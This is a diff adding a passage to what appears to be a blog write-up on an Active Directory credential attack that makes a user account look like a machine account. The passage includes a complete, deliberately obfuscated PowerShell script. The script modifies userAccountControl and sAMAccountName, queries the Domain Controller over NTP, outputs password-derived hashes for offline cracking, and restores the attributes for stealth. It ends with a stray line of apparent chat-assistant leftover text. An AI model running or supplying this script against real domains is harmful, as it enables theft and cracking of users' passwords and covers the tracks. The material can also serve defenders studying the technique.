@@ -77,3 +77,58 @@ Here’s a quick summary:
 | `objectCategory`     | Schema-based classification                 | `CN=Person,...` or `CN=Computer,...` |
 | `userAccountControl` | **Determines behavior and type** via flags  | `0x0200` = user, `0x1000` = machine  |
 | `sAMAccountName`     | Login name (trailing `$` is cosmetic only)  | `alice$`, `PC01$`                    |
+
+So, as you may have guessed, the goal is to **target a user account** by modifying some of its attributes, specifically the `UserAccountControl`, to make it appear as a **machine account**. This way, the **Domain Controller** will generate a **MAC** in its response based on the **user’s password**, just as it would for a legitimate machine account. To achieve this, and to automate the process, we wrote a **PowerShell script** that:
+
+* Adds the appropriate **`UserAccountControl`** flag to the targeted user account.
+* Sends the crafted **NTP request** to the Domain Controller.
+* Formats the response data properly for **offline cracking**.
+* Then restores the original attribute values for better **OPSEC**.
+
+We based our work on the script from the article I mentioned earlier.
+Here’s the code:
+
+```powershell
+param(
+    [Parameter(Mandatory=$true)][Alias("dc")][string]$a,
+    [Alias("target")][string]$b,
+    [Alias("targets")][string]$c
+)
+
+Import-Module ActiveDirectory
+$d=4096
+$e=@()
+if (!$b -and !$c){Write-Host "[!] Use -target or -targets." -ForegroundColor Red;Exit}
+if ($b -and $c){Write-Host "[!] Use only -target or -targets, not both." -ForegroundColor Red;Exit}
+$e=if ($b){@($b)}else{Get-Content $c}
+$f=[byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)
+$g=New-Object System.Net.Sockets.UdpClient
+$g.Client.ReceiveTimeout=6
+$g.Connect($a,123)
+
+foreach ($h in $e){
+    try{$i=Get-ADUser -Identity $h -Properties DistinguishedName,UserAccountControl}catch{continue}
+    $j=(New-Object System.Security.Principal.NTAccount($h)).Translate([System.Security.Principal.SecurityIdentifier])
+    $k=($j.Value -split '-')[ -1 ]
+    $l=$i.UserAccountControl
+    $m=$i.DistinguishedName
+    $n=if ($h[-1] -ne "$"){$h+"$"}else{$h}
+    Set-ADUser -Identity $m -Replace @{userAccountControl=$d;samAccountName=$n}
+    $o=$f+[BitConverter]::GetBytes([int]$k)+[byte[]]::new(16)
+    try{
+        [void]$g.Send($o,$o.Length)
+        $p=$g.Receive([ref]$null)
+        if ($p.Length -eq 68){
+            $q=[byte[]]$p[0..47]
+            $r=[byte[]]$p[-16..-1]
+            $s=[BitConverter]::ToString($q).Replace("-","").ToLower()
+            $t=[BitConverter]::ToString($r).Replace("-","").ToLower()
+            Write-Host ("{0}:`$sntp-ms`{1}`${2}" -f $k,$t,$s) -ForegroundColor Green
+        }
+    }catch{}
+    Set-ADUser -Identity $m -Replace @{samAccountName=$h;userAccountControl=$l}
+}
+$g.Close()
+```
+
+*(You can now paste the script so I can format and annotate it if needed.)*
